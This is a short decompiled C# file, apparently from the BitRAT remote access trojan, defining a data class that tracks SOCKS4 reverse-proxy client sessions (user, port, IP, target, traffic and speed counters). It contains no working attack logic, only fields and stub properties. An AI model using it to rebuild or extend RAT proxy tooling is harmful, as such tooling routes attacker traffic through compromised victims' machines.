﻿namespace BitRAT
{
    using System;

    public class cSocks4Rcli
    {
        public string[] idxValues;
        public string Key;
        private string m_user;
        private string m_port;
        private string m_duration;
        private string m_tag;
        public bool bJustConnected;
        public bool pending_dc;
        public bool pending_dc_timeout;
        public bool rejected;
        public long lStarted;
        public double dRecv;
        public double dSent;

        public cSocks4Rcli();

        public string USER { get; set; }

        public string PORT { get; set; }

        public string DURATION { get; set; }

        public string IP { get; set; }

        public string SENT { get; set; }

        public string RECV { get; set; }

        public string TARGET { get; set; }

        public string SPEED_DL { get; set; }

        public string SPEED_UL { get; set; }

        public string Tag { get; set; }
    }
}

